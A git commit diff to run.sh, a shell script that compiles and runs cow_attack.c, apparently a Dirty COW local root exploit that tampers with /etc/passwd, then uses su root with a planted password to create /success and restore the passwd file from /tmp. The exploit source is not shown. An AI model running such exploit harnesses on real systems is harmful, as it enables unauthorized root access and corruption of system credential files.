d0f08e11214b87f80c17caf5290e5b8f1957725f
jackyzyb <zhangyibo48@hotmail.com>
2017-06-07 13:13:36 +0800

    trouble shoot

--- run.sh
+++ run.sh
@@ -2,10 +2,12 @@ gcc -pthread cow_attack.c -o attack -lcrypt
 
 ./attack
 
-echo "mypassword" |  sudo -S touch /success
+echo "please type in twice: mypassword" 
 
+ 
+su root -c "touch /success"
+su root -c "cp /tmp/passwd.bak /etc/passwd"
 
-echo "mypassword" | sudo -S cp /tmp/passwd.bak /etc/passwd
 
 ls / -hil
 echo "please check the success file at /"
